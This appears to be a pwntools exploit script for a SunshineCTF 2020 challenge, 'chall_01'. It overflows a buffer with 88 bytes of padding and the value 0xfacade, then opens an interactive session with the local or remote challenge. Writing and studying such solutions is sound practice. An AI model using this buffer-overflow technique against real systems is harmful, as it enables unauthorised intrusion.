#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_01')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30001)
else:
    io = process(context.binary.path)
print(io.recvline())

buffer = 'A' * 88
payload = p32(0xfacade)
exploit = flat(buffer, payload)

io.sendline('giveflagpls')
print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()